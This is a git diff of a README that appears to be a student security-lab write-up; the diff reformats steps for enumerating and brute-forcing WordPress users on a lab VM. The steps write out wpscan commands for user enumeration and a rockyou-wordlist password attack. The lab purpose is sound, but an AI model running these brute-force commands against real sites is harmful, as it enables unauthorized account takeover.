@@ -33,21 +33,15 @@ Time spent: 6 hours spent in total
   - [ ] GIF Walkthrough: <br />
      ![](EramUserEnumerating.gif)
   - [ ] Steps to recreate: <br /> <ul><li>Install worlists and get rockyou-75.txt. Make sure rockyou-75.txt is in /home/kali/Desktop/rockyou-75.txt</li> 
-  ```
-      $ apt-get install wordlists
+  ``` $ apt-get install wordlists
       $ cd \usr\share\wordlists\
-      $ gzip -d rockyou-75.txt.gz
-    ```
-  <li> Get Api token from https://wpvulndb.com/ <li>
+      $ gzip -d rockyou-75.txt.gz ```
+  <li> Get Api token from https://wpvulndb.com/ </li>
   <li> use token to find users
-  ```
-      $ wpscan --url wpdistillery.vm -e u vp --api-token <token name>
-    ```
+  ```$ wpscan --url wpdistillery.vm -e u vp --api-token <token name>```
   </li>
   <li> use token to find password
-  ```
-      $ wpscan --url wpdistillery.vm -e u --passwords /home/kali/Desktop/rockyou-75.txt --api-token <token name>
-  ```
+  ```$ wpscan --url wpdistillery.vm -e u --passwords /home/kali/Desktop/rockyou-75.txt --api-token <token name>```
   </li>
 </ul>
   - [ ] Affected source code:
